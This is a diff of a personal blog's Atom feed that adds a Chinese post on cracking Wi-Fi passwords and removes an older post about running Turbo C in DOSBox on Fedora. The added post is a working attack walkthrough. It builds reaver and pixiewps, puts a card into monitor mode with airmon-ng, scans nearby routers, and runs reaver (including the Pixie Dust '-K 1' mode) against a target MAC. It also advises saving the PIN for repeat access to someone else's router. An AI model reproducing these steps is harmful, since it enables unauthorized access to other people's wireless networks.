@@ -1,4 +1,71 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2016-12-30T19:43:17+08:00</updated><id>//</id><title type="html">BLOG|LEXUGE</title><subtitle>This is a personal website.It is LEXUGE's BLOG.Welcome to my website!</subtitle><entry><title type="html">LEDIT及EDIT简述</title><link href="/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0.html" rel="alternate" type="text/html" title="LEDIT及EDIT简述" /><published>2016-12-22T19:40:00+08:00</published><updated>2016-12-22T19:40:00+08:00</updated><id>/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0</id><content type="html" xml:base="/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0.html">&lt;p&gt;&lt;strong&gt;LEDIT及EDIT简述&lt;/strong&gt;&lt;br /&gt;
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2016-12-31T17:50:28+08:00</updated><id>//</id><title type="html">BLOG|LEXUGE</title><subtitle>This is a personal website.It is LEXUGE's BLOG.Welcome to my website!</subtitle><entry><title type="html">reaver破解Wi-Fi密码</title><link href="/jekyll/update/2016/12/31/reaver%E7%A0%B4%E8%A7%A3Wi-Fi%E5%AF%86%E7%A0%81.html" rel="alternate" type="text/html" title="reaver破解Wi-Fi密码" /><published>2016-12-31T17:35:00+08:00</published><updated>2016-12-31T17:35:00+08:00</updated><id>/jekyll/update/2016/12/31/reaver%E7%A0%B4%E8%A7%A3Wi-Fi%E5%AF%86%E7%A0%81</id><content type="html" xml:base="/jekyll/update/2016/12/31/reaver%E7%A0%B4%E8%A7%A3Wi-Fi%E5%AF%86%E7%A0%81.html">&lt;p&gt;&lt;a href=&quot;https://github.com/t6x/reaver-wps-fork-t6x&quot;&gt;reaver最新版主页&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/wiire/pixiewps&quot;&gt;pixiewps主页&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://lexuge.github.io/jekyll/update/2016/08/28/%E4%BD%BF%E7%94%A8mdk3+aircrack-ng%E6%94%BB%E5%87%BB%E8%B7%AF%E7%94%B1%E5%99%A8.html&quot;&gt;mdk3攻击路由器&lt;/a&gt;&lt;br /&gt;
+借助最新的工具reaver可以破解WPA/WPA2（带有WPS）的路由器&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;编译reaver
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/t6x/reaver-wps-fork-t6x
+cd reaver-wps-fork-t6x*/
+cd src/
+./configure
+make
+sudo make install
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;编译pixiewps
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/wiire/pixiewps
+cd pixiewps*/
+cd src/
+make
+sudo make install
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;使用reaver&lt;br /&gt;
+使用&lt;code class=&quot;highlighter-rouge&quot;&gt;reaver -h&lt;/code&gt;可显示帮助
+    &lt;ul&gt;
+      &lt;li&gt;使网卡变为监听模式:&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo airmon-ng start wlp2s0&lt;/code&gt;(具体步骤见mdk3攻击路由器的前几步)&lt;/li&gt;
+      &lt;li&gt;搜索附近路由:&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo airodump-ng wlp2s0mon&lt;/code&gt;&lt;br /&gt;
+接下来就可以使用reaver了&lt;br /&gt;
+若要在几秒钟内瞬间得到密码(不保证适应全部路由):&lt;code class=&quot;highlighter-rouge&quot;&gt;reaver -i wlp2s0mon -b (MAC) -vvv -K 1&lt;/code&gt;&lt;br /&gt;
+若要100%得到密码(几个小时以上):&lt;code class=&quot;highlighter-rouge&quot;&gt;reaver -i wlp2s0mon -b (MAC)&lt;/code&gt;&lt;br /&gt;
+Tip:得到密码后一定要记下PIN，这样下次就可以直接获得密码(对方不更改PIN)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;</content><summary type="html">reaver最新版主页
+pixiewps主页
+mdk3攻击路由器
+借助最新的工具reaver可以破解WPA/WPA2（带有WPS）的路由器
+
+  编译reaver
+    git clone https://github.com/t6x/reaver-wps-fork-t6x
+cd reaver-wps-fork-t6x*/
+cd src/
+./configure
+make
+sudo make install
+
+    
+  
+  编译pixiewps
+    git clone https://github.com/wiire/pixiewps
+cd pixiewps*/
+cd src/
+make
+sudo make install
+
+    
+  
+  使用reaver
+使用reaver -h可显示帮助
+    
+      使网卡变为监听模式:sudo airmon-ng start wlp2s0(具体步骤见mdk3攻击路由器的前几步)
+      搜索附近路由:sudo airodump-ng wlp2s0mon
+接下来就可以使用reaver了
+若要在几秒钟内瞬间得到密码(不保证适应全部路由):reaver -i wlp2s0mon -b (MAC) -vvv -K 1
+若要100%得到密码(几个小时以上):reaver -i wlp2s0mon -b (MAC)
+Tip:得到密码后一定要记下PIN，这样下次就可以直接获得密码(对方不更改PIN)</summary></entry><entry><title type="html">LEDIT及EDIT简述</title><link href="/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0.html" rel="alternate" type="text/html" title="LEDIT及EDIT简述" /><published>2016-12-22T19:40:00+08:00</published><updated>2016-12-22T19:40:00+08:00</updated><id>/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0</id><content type="html" xml:base="/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0.html">&lt;p&gt;&lt;strong&gt;LEDIT及EDIT简述&lt;/strong&gt;&lt;br /&gt;
 EDIT是LEXUGE用C语言制作的一款命令行文本编辑软件，目前功能简单&lt;br /&gt;
 LEDIT是LEXUGE在Linux下用纯C制作，不依赖任何非标准函数库的终端文本编辑软件，功能与EDIT一样&lt;br /&gt;
 上述两款软件全部遵守&lt;a href=&quot;http://www.gnu.org/licenses/gpl.txt&quot;&gt;GPL协议&lt;/a&gt;(以本文所述作为最后实际有效话语)&lt;br /&gt;
@@ -259,44 +326,4 @@ PS:资源下载已搬迁至about页面&lt;/p&gt;</content><summary type="html">�
     
   
   找到关键字 HandleLidSwitch 将其值改为 ignore。并把本行头的注释去掉：
-    HandleLidSwitch=ignore</summary></entry><entry><title type="html">在Fedora上使用TC3.0</title><link href="/jekyll/update/2016/08/30/%E5%9C%A8Fedora%E4%B8%8A%E4%BD%BF%E7%94%A8TC3.0.html" rel="alternate" type="text/html" title="在Fedora上使用TC3.0" /><published>2016-08-30T08:41:00+08:00</published><updated>2016-08-30T08:41:00+08:00</updated><id>/jekyll/update/2016/08/30/%E5%9C%A8Fedora%E4%B8%8A%E4%BD%BF%E7%94%A8TC3.0</id><content type="html" xml:base="/jekyll/update/2016/08/30/%E5%9C%A8Fedora%E4%B8%8A%E4%BD%BF%E7%94%A8TC3.0.html">&lt;blockquote&gt;
-  &lt;p&gt;Turbo C是美国Borland公司的产品，Borland公司是一家专门从事软件开发、研制的大公司。该公司相继推出了一套 Turbo系列软件, 如Turbo BASIC, Turbo Pascal, Turbo Prolog, 这些软件很受用户欢迎。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://download.pchome.net/development/linetools/detail-9113.html&quot;&gt;Turbo C3.0英文原版安装包&lt;/a&gt;&lt;br /&gt;
-如何在Linux上使用Turbo C3.0呢？&lt;br /&gt;
-我们将下载的安装包解压在/home/{username}/TurboC3.0中&lt;br /&gt;
-现在我们需要安装DOSBOX来模拟DOS环境:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo dnf install dosbox.x86_64
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;安装完毕后我们打开dosbox，默认的提示符是Z，我们使用mount命令来挂载,使在dosbox内的程序将/home/{username}/TurboC3.0作为C:\&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount c /home/{username}/TurboC3.0
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;打开C:\&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;进行安装:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;install
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;在安装界面中SOURCE drive选择C，也相当于/home/{username}/TurboC3.0&lt;br /&gt;
-其余默认&lt;br /&gt;
-最后选择start installation&lt;br /&gt;
-完成后，TurboC3.0主程序会在/home/{username}/TurboC3.0/TC/BIN/TC.EXE&lt;/p&gt;
-
-&lt;p&gt;再次打开DOSBOX&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount c /home/{username}/TurboC3.0
-c:
-cd /tc/bin
-tc
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;OK,可以编写程序进行测试，如果不行，可以&lt;strong&gt;更改函数库路径&lt;/strong&gt;解决&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;祝你成功！&lt;/strong&gt;&lt;/p&gt;</content><summary type="html">Turbo C是美国Borland公司的产品，Borland公司是一家专门从事软件开发、研制的大公司。该公司相继推出了一套 Turbo系列软件, 如Turbo BASIC, Turbo Pascal, Turbo Prolog, 这些软件很受用户欢迎。</summary></entry></feed>
+    HandleLidSwitch=ignore</summary></entry></feed>
